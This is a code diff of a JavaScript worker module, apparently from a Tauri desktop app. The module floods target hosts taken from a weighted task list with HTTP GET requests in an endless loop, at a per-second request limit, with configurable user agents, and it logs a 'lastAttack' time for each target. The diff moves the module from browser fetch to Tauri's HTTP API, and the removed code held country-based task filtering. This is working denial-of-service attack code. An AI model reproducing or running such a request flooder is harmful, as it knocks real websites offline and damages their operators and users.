@@ -1,68 +1,38 @@
 import weightedRandom from 'weighted-random';
-import { reactive } from 'vue';
+import state from '@/utils/state.js';
 
 let statusWorker = false;
-const shootIntervalSeconds = 10;
+const shootIntervalSeconds = 5;
 
-export const state = reactive({
-  totalRequests: 0,
-  limitRequestsPerSecond: 300,
-  country: 'UA',
-  ipAddress: '0.0.0.0',
-  tasks: [],
-  weight: [],
-  startWorker: undefined,
-  changeLimit(value) {
-    this.limitRequestsPerSecond = value;
-  },
-  setCountry(isoCode) {
-    this.country = isoCode;
-  },
-  setIpAddress(ip) {
-    this.ipAddress = ip;
-  },
-  setTasks(data) {
-    this.tasks = data.filter((x) => {
-      if (!x.enabled) {
-        return false;
-      }
-      if (this.country === 'UA' && !x.uaAllowed) {
-        return false;
-      }
-      return true;
-    });
-    this.weight = this.tasks.map((x) => x.weight || 0.5);
-  },
-});
+async function fetchWithTimeout(resource, proto) {
+  const fetchOptions = {
+    method: 'GET',
+    headers: { 'User-Agent': state.userAgents },
+    timeout: 8000,
+    responseType: 2, // https://tauri.studio/docs/api/js/enums/http.responsetype/
+  };
 
-async function fetchWithTimeout(resource) {
-  const timeout = 8000;
-
-  const controller = new AbortController();
-  const id = setTimeout(() => controller.abort(), timeout);
-  let response = undefined;
   try {
-    response = await fetch(resource, {
-      signal: controller.signal,
-      mode: 'no-cors'
-    });
-  } catch {
-    clearTimeout(id);
-    return response;
+    await window.__TAURI__.http.fetch(`${proto}://${resource}`, fetchOptions);
+  } catch (e) {
+    return '';
   }
-  clearTimeout(id);
-  return response;
+  return '';
 }
 
 const createFetchesArray = () => {
   const fetchArray = [];
   for (let i = 1; i <= shootIntervalSeconds * state.limitRequestsPerSecond; i++) {
     const randomUrlIdx = weightedRandom(state.weight);
-    const { url } = state.tasks[randomUrlIdx];
-    fetchArray.push(fetchWithTimeout(url));
+    const { host, proto, _id } = state.tasks[randomUrlIdx];
+    fetchArray.push(fetchWithTimeout(host, proto));
     state.totalRequests += 1;
+    state.log[_id] = {
+      ...state.log[_id],
+      count: state.log[_id].count + 1,
+      lastAttack: new Date(),
+    };
   }
-
   return fetchArray;
 };
 
@@ -73,27 +43,25 @@ const worker = async () => {
   }
   state.startWorker = +new Date();
   state.totalRequests = 0;
+
   // eslint-disable-next-line
-  setInterval(() => {
+  while (1) {
     const fetches = createFetchesArray();
     try {
       Promise.all(fetches);
     } catch {
       console.log('Somewhere has been rejected, current requests =>', state.totalRequests);
     }
-  }, shootIntervalSeconds * 1000);
+    await new Promise((r) => setTimeout(r, shootIntervalSeconds * 1000));
+  }
 };
 
 const startWorker = () => {
   if (!statusWorker) {
     statusWorker = true;
-    worker();
+    // worker();
   }
 };
 
-const stopWorker = () => {
-  statusWorker = false;
-};
-
-export { startWorker, stopWorker };
+export { startWorker };
 export default worker;
